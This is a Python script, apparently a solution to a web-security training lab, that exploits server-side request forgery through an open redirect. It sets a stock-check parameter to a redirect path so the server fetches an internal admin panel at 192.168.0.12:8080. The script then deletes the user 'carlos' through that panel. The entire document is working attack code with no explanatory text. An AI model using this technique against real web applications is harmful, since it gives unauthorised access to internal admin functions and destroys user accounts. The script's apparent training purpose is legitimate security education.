import requests
import sys
from bs4 import BeautifulSoup



def check_url(raw_url):
    return raw_url.rstrip('/')


def check_user_exist(base_url):

    check_stock_url = base_url + '/product/stock'

    data = {
        'stockApi':'/product/nextProduct?path=http://192.168.0.12:8080/admin'
    }

    response = requests.post(check_stock_url, data = data)

    soup = BeautifulSoup(response.text, "html.parser")
    links = soup.find_all('a', href = "/http://192.168.0.12:8080/admin/delete?username=carlos")

    if links:
        return 1
    else:
        print(links)
        return 0


def del_carlos(base_url):

    if not check_user_exist(base_url):
        print("User not found.")
        sys.exit(1)

    check_stock_url = base_url + '/product/stock'

    payload = {
        'stockApi':'/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
    }

    response = requests.post(check_stock_url, data = payload)

    if "User deleted successfully!" in response.text:
        print("User deleted successfully!")

    else:
        print("User deleted failed.")
        print(response.text)
        sys.exit(1)


args = sys.argv[1:]
base_url = check_url(args[0])
del_carlos(base_url)
